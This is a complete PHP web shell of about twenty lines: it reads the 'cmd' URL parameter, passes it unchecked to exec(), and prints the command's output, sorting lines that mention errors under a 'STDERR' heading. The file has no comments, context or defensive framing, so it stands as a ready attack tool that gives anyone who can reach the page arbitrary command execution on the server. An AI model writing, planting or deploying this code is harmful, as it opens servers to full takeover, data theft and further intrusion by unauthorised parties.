<?php
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];

    $output = [];
    $return_var = 0;
    exec("$cmd 2>&1", $output, $return_var);

    $stdout = [];
    $stderr = [];
    foreach ($output as $line) {
        if (preg_match('/error|not found|failed/i', $line)) {
            $stderr[] = $line;
        } else {
            $stdout[] = $line;
        }
    }

    if (!empty($stdout)) {
        echo implode("\n", $stdout);
    }

    if (!empty($stderr)) {
        echo "\nSTDERR:\n";
        echo implode("\n", $stderr);
    }
}
?>
